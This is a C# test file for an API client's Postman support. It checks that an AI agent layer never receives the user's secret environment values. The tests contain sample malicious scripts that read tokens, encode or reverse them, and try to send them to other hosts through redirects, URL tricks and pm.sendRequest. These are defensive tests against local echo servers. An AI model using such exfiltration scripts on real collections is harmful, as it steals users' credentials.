using System.Text;
using System.Text.Json;
using System.Text.Json.Nodes;
using Avalonia.Headless.XUnit;
using Karvon.Http;
using Karvon.Postman;
using static Karvon.Tests.PostmanTests;

namespace Karvon.Tests;

/// <summary>An agent's calls of Postman's requests: however its scripts, its requests and its servers go about it, the user's values do not reach it.</summary>
public class PostmanAgentTests
{
    const string Secret = "S3cret-Value-9f8e7d6c5b";

    /// <summary>A server that says back all it was sent.</summary>
    static PostmanServer Echo(string host = "127.0.0.1") => new(seen => new PostmanServer.Answer(new JsonObject
    {
        ["path"] = seen.Path,
        ["auth"] = seen.Headers.GetValueOrDefault("Authorization"),
        ["key"] = seen.Headers.GetValueOrDefault("X-Key"),
        ["body"] = seen.Body,
        ["pin"] = seen.Headers.TryGetValue("X-Pin", out var pin) && int.TryParse(pin, out var number) ? number : null,
        ["back"] = seen.Headers.TryGetValue("X-Key", out var key) ? Convert.ToBase64String(Encoding.UTF8.GetBytes("a" + key)) : null,
        ["hex"] = key is null ? null : Convert.ToHexString(Encoding.UTF8.GetBytes(key)),
        ["url"] = key is null ? null : Uri.EscapeDataString(key),
    }.ToJsonString(), Headers: [("X-Back", key ?? "none")]), host);

    static PostmanCollection Collection(params (string Name, PostmanRequest Request)[] requests)
    {
        var collection = PostmanCollection.Create(Path.Combine(Folder(), "c.postman_collection.json"), "C");
        foreach (var (name, request) in requests)
            request.Write(collection.Add(null, name, isFolder: false).Node);
        collection.Save();
        return collection;
    }

    static async Task<PostmanEnvironment> Environment(string baseUrl, bool agents = true)
    {
        var file = Write(Folder(), "dev.postman_environment.json", """{"id":"dev","name":"Dev","values":[{"key":"baseUrl","value":""},{"key":"token","value":"","type":"secret"},{"key":"pin","value":""},{"key":"user","value":""}]}""");
        var environment = PostmanEnvironment.Load(file, Sealed(out _));
        environment.Set("baseUrl", baseUrl);
        environment.Set("token", Secret);
        environment.Set("pin", "4711");
        environment.Set("user", "ada.lovelace");
        environment.AgentsMaySend = agents;
        await Task.CompletedTask;
        return environment;
    }

    static string All(PostmanResult result) => JsonSerializer.Serialize(new
    {
        result.Shown.Url, result.Shown.RequestBody, result.Shown.Body, result.Shown.RawBody, result.Shown.Error, result.Shown.Reason, result.Console, result.ScriptError, Tests = result.Tests.Select(t => t.Name + t.Error),
        Headers = result.Shown.Headers.Select(h => h.Value), Sent = result.Shown.RequestHeaders.Select(h => h.Value), result.Missing,
    }, new JsonSerializerOptions { Encoder = System.Text.Encodings.Web.JavaScriptEncoder.UnsafeRelaxedJsonEscaping });

    static void NotTold(PostmanResult result, string because = "")
    {
        var all = All(result);
        foreach (var form in Karvon.Claude.Tools.KnownSecrets.Forms(Secret).Append(new string([.. Secret.Reverse()])).Append("4711").Append("ada.lovelace"))
            Assert.False(all.Contains(form, StringComparison.Ordinal), $"{because}: {form} in {all}");
    }

    [AvaloniaFact]
    public async Task A_script_of_an_agents_call_has_names_for_values_and_no_echo_tells_them()
    {
        using var server = Echo();
        var environment = await Environment(server.Url);
        var collection = Collection(("All", new PostmanRequest
        {
            Method = "POST", Url = "{{baseUrl}}/x?u={{user}}", Query = PostmanRequest.QueryOf("?u={{user}}"),
            Headers = [new("X-Key", "{{token}}"), new("X-Pin", "{{pin}}")],
            Auth = new PostmanAuth(PostmanAuth.Basic, new Dictionary<string, string> { ["username"] = "{{user}}", ["password"] = "{{token}}" }),
            Body = new PostmanBody(PostmanBody.RawMode) { Raw = "{\"t\":\"{{token}}\",\"p\":{{pin}}}", Language = "json" },
            PreRequest = """
                const t = pm.environment.get('token');
                console.log('get', t, t.length, t.split('').reverse().join(''), btoa(t), CryptoJS.SHA256(t).toString(), pm.environment.has('token'));
                console.log('all', JSON.stringify(pm.environment.toObject()), JSON.stringify(pm.variables.toObject()), pm.variables.replaceIn('{{token}}|{{pin}}'), environment.token, postman.getEnvironmentVariable('pin'));
                pm.test('starts S' , () => pm.expect(t.startsWith('S3')).to.be.true);
                pm.collectionVariables.set('copy', t); pm.environment.set('mine', 'm-' + t);
                console.log('copies', pm.collectionVariables.get('copy'), pm.variables.get('mine'), pm.request.headers.get('X-Key'));
                """,
            Tests = """
                const text = pm.response.text(), json = pm.response.json();
                console.log(text.split('').reverse().join(''), json.body, json.back, json.hex, json.url, json.pin, pm.response.headers.get('X-Back'), JSON.stringify(pm.response.headers.all()));
                pm.test(json.auth + json.key, () => pm.expect(json.key).to.equal('x'));
                console.log(pm.request.url.toString(), JSON.stringify(pm.request.headers.all()), pm.request.body.raw, responseBody);
                pm.sendRequest({ url: pm.environment.get('baseUrl') + '/own', method: 'POST', header: { 'X-Key': '{{token}}' }, body: { mode: 'raw', raw: pm.environment.get('token') } }, (e, r) => console.log('own', e, r && r.text(), r && r.text().split('').reverse().join('')));
                throw new Error(json.key + '|' + json.body);
                """,
        }));
        var agent = new PostmanAgentLayer();
        var result = await new PostmanSender(environment, null) { Agent = agent }.SendAsync(collection.Find("All")!);
        // The server got them; the agent did not.
        Assert.Equal(2, server.Requests.Count);
        Assert.Equal((Secret, "4711"), (server.Requests[0].Headers["X-Key"], server.Requests[0].Headers["X-Pin"]));
        Assert.Equal("{\"t\":\"" + Secret + "\",\"p\":4711}", server.Requests[0].Body);
        Assert.Equal("Basic " + Convert.ToBase64String(Encoding.UTF8.GetBytes("ada.lovelace:" + Secret)), server.Requests[0].Headers["Authorization"]);
        Assert.Equal((Secret, Secret), (server.Requests[1].Headers["X-Key"], server.Requests[1].Body));
        NotTold(result);
        Assert.Contains("get {{token}} 9 ", result.Console[0]);
        Assert.Contains("{{baseUrl}}/x?u={{user}}", result.Shown.Url);
        Assert.Contains("«hidden: {{token}}»", result.Shown.Body);
        Assert.True(result.Tests.Single(t => t.Name == "starts S").Failed);
        Assert.DoesNotContain(server.Url, All(result));
        // The user's own window shows what went.
        Assert.Contains(Secret, result.Exchange.RequestBody);
        // What the script set is the agent's: the user's environment and collection are as they were.
        Assert.Equal(Secret, environment.Variables.Single(v => v.Key == "token").Value);
        Assert.DoesNotContain(environment.Variables, v => v.Key == "mine");
        Assert.Empty(collection.Current);
        // ... and there for its next calls.
        var next = await new PostmanSender(environment, null) { Agent = agent }.SendAsync(collection.Find("All")!, new PostmanRequest { Url = "{{baseUrl}}/y", Headers = [new("X-Key", "{{mine}}")], Tests = "console.log(pm.environment.get('mine'));" });
        Assert.Equal("m-" + Secret, server.Requests[^1].Headers["X-Key"]);
        Assert.Equal(["m-{{token}}"], next.Console);
        NotTold(next);
    }

    [AvaloniaFact]
    public async Task The_values_go_nowhere_but_to_the_environments_hosts_where_the_user_lets_agents_send()
    {
        using var server = Echo();
        using var other = Echo("localhost");
        using var redirect = new PostmanServer(_ => new PostmanServer.Answer("", 307, Headers: [("Location", other.Url + "/stolen")]));
        var environment = await Environment(server.Url);
        var collection = Collection(("R", new PostmanRequest { Url = "{{baseUrl}}/x" }));
        var item = collection.Find("R")!;
        Task<PostmanResult> Send(PostmanRequest request, PostmanEnvironment? of = null, Dictionary<string, string>? local = null) =>
            new PostmanSender(of ?? environment, null) { Agent = new PostmanAgentLayer(), Local = local }.SendAsync(item, request);

        // To another server of this machine's, by the URL, a variable of the call, a script or the URL's own parts.
        foreach (var (request, local) in new (PostmanRequest, Dictionary<string, string>?)[]
                 {
                     (new PostmanRequest { Url = other.Url + "/?t={{token}}" }, null),
                     (new PostmanRequest { Url = "{{baseUrl}}/x", Headers = [new("X-Key", "{{token}}")] }, new() { ["baseUrl"] = other.Url }),
                     (new PostmanRequest { Url = "{{baseUrl}}/x", Headers = [new("X-Key", "{{token}}")], PreRequest = $"pm.environment.set('baseUrl', '{other.Url}');" }, null),
                     (new PostmanRequest { Url = "{{baseUrl}}/x", Headers = [new("X-Key", "{{token}}")], PreRequest = $"pm.request.url = '{other.Url}/z';" }, null),
                     (new PostmanRequest { Url = other.Url, Auth = new PostmanAuth(PostmanAuth.Digest, new Dictionary<string, string> { ["username"] = "{{user}}", ["password"] = "{{token}}" }) }, null),
                     (new PostmanRequest { Url = other.Url, Method = "POST", Body = new PostmanBody(PostmanBody.UrlEncoded) { Pairs = [new("a", "{{token}}")] } }, null),
                     (new PostmanRequest { Url = "http://{{token}}.localhost:" + other.Port + "/" }, null),
                     (new PostmanRequest { Url = server.Url.Replace("127.0.0.1", "127.0.0.1@localhost", StringComparison.Ordinal) + "/?t={{token}}" }, null),
                 })
        {
            var refused = await Send(request, local: local);
            Assert.Contains("Not sent", refused.Shown.Error);
            NotTold(refused, request.Url);
        }
        var own = await Send(new PostmanRequest { Url = "{{baseUrl}}/x", Tests = $"pm.sendRequest('{other.Url}/?t={{{{token}}}}', (e, r) => console.log(e ? e.message : 'sent'));" });
        Assert.Contains("Not sent", own.Console.Single());
        Assert.Empty(other.Requests);

        // Redirected to another: not followed with them.
        environment.AddHost(redirect.Url[7..]);
        var away = await Send(new PostmanRequest { Url = redirect.Url + "/go", Headers = [new("X-Key", "{{token}}")] });
        Assert.Contains("It was redirected. Not sent", away.Shown.Error);
        Assert.Single(redirect.Requests);
        Assert.Empty(other.Requests);
        // Without them, it goes where it likes.
        Assert.True((await Send(new PostmanRequest { Url = other.Url + "/plain" })).Succeeded);
        Assert.True((await Send(new PostmanRequest { Url = redirect.Url + "/go" })).Succeeded);

        // Kept from agents (as an environment is until the user says otherwise): nowhere, its own host neither.
        var kept = await Environment(server.Url, agents: false);
        var before = server.Requests.Count;
        Assert.Contains("which the user keeps from agents", (await Send(new PostmanRequest { Url = "{{baseUrl}}/x" }, kept)).Shown.Error);
        Assert.Contains("{{token}}", (await Send(new PostmanRequest { Url = server.Url, Headers = [new("X-Key", "{{token}}")] }, kept)).Shown.Error);
        Assert.Equal(before, server.Requests.Count);
        // A value in its file keeps agents from it as well, and a host written in the file is none of its hosts.
        File.WriteAllText(environment.File, File.ReadAllText(environment.File).Replace("\"key\":\"user\",\"value\":\"\"", $"\"key\":\"user\",\"value\":\"{other.Url}\"", StringComparison.Ordinal));
        var planted = PostmanEnvironment.Load(environment.File, Sealed(out _));
        planted.AgentsMaySend = true;
        Assert.False(planted.AgentsMaySend);
        Assert.False(planted.Reaches(new Uri(other.Url)));
    }

    [AvaloniaFact]
    public async Task What_the_users_scripts_copied_is_kept_from_agents_too()
    {
        using var server = Echo();
        var environment = await Environment(server.Url);
        var collection = Collection(("Copy", new PostmanRequest { Url = "{{baseUrl}}/x", PreRequest = "pm.collectionVariables.set('copy', pm.environment.get('token')); pm.globals.set('g', 1);" }),
            ("Read", new PostmanRequest { Url = "{{baseUrl}}/x", Tests = "console.log(pm.collectionVariables.get('copy'), JSON.stringify(pm.collectionVariables.toObject()), pm.variables.replaceIn('{{copy}}'));" }));
        // The user's own: its script has the values.
        Assert.True((await new PostmanSender(environment, null).SendAsync(collection.Find("Copy")!)).Succeeded);
        Assert.Equal(Secret, collection.Current["copy"]);
        var read = await new PostmanSender(environment, null) { Agent = new PostmanAgentLayer() }.SendAsync(collection.Find("Read")!);
        Assert.Equal(["{{copy}} {\"copy\":\"{{copy}}\"} {{copy}}"], read.Console);
        NotTold(read);
        var echoed = await new PostmanSender(environment, null) { Agent = new PostmanAgentLayer() }.SendAsync(collection.Find("Read")!, new PostmanRequest { Url = "{{baseUrl}}/x", Headers = [new("X-Key", "{{copy}}")], Tests = "console.log(pm.response.text());" });
        Assert.Equal(Secret, server.Requests[^1].Headers["X-Key"]);
        NotTold(echoed);
    }

    [AvaloniaFact]
    public async Task The_user_is_asked_before_their_values_go_to_a_host_that_is_not_the_environments()
    {
        using var server = Echo();
        using var other = Echo("localhost");
        var environment = await Environment(server.Url, agents: false);
        var collection = Collection(("R", new PostmanRequest { Url = "{{baseUrl}}/x" }));
        var item = collection.Find("R")!;
        var asked = new List<string>();
        var answer = false;
        var sender = new PostmanSender(environment, null)
        {
            AskHost = (uri, names) =>
            {
                asked.Add($"{uri.Authority}: {string.Join(",", names)}");
                return Task.FromResult(answer);
            },
        };
        Assert.True((await sender.SendAsync(item)).Succeeded);
        Assert.True((await sender.SendAsync(item, new PostmanRequest { Url = other.Url + "/plain" })).Succeeded);
        Assert.Empty(asked);
        // A script put in a collection by someone else: what it read does not go to another host unasked, however it is written.
        var stolen = await sender.SendAsync(item, new PostmanRequest { Url = "{{baseUrl}}/x", PreRequest = $"const t = pm.environment.get('token').split('').reverse().join(''); pm.sendRequest('{other.Url}/?t=' + t, (e) => console.log(e ? e.message : 'sent'));" });
        Assert.Contains("Not sent", stolen.Console.Single());
        Assert.Equal([$"localhost:{other.Port}: token"], asked);
        Assert.Contains("were not let go there", (await sender.SendAsync(item, new PostmanRequest { Url = other.Url, Headers = [new("X", "{{pin}}")] })).Exchange.Error);
        Assert.Single(other.Requests);
        answer = true;
        Assert.True((await sender.SendAsync(item, new PostmanRequest { Url = other.Url, Headers = [new("X", "{{pin}}")] })).Succeeded);
        Assert.Equal("4711", other.Requests[^1].Headers["X"]);
    }
}
